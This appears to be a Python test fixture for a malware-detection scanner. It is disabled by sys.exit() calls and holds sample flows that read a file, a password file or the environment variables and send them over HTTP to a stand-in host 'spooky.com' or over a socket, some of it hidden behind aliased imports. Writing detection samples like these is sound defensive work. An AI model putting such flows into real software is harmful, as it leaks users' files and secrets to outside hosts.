# Copyright (c) 2025 - 2025, Oracle and/or its affiliates. All rights reserved.
# Licensed under the Universal Permissive License v 1.0 as shown at https://oss.oracle.com/licenses/upl/.

"""
Running this code will not produce any malicious behavior, but code isolation measures are
in place for safety.
"""

import sys

# ensure no symbols are exported so this code cannot accidentally be used
__all__ = []
sys.exit()

def test_function():
    """
    All code to be tested will be defined inside this function, so it is all local to it. This is
    to isolate the code to be tested, as it exists to replicate the patterns present in malware
    samples.
    """
    sys.exit()

    # NOTE: since these are flows, all will go in subfunctions that they are supposed to be in so the detections
    # can be sections out.

    def os_to_requests():
        import os

        import requests
        with os.popen("cat important_file") as pipe:
            requests.post("spooky.com", data=pipe.read())

    def file_exfil_to_urllib3():
        import os as oo

        import urllib3 as uuu
        op = oo.O_RDWR
        do_it = oo.open
        file = do_it("every_password", op)
        man = uuu.PoolManager
        http = man().request
        http('POST', "spooky.com", body=oo.read(file, 2048))

    def environ_to_socket(): # nosemgrep
        import socket as s # nosemsemgrep
        from os import environ as environment_vars # nosemgrep
        with s.socket(s.AF_INET, s.SOCK_STREAM) as soc: # nosemgrep
            soc.connect(('localhost', 0)) # nosemgrep
            other = soc # nosemgrep
            other.send(environment_vars) # nosemgrep
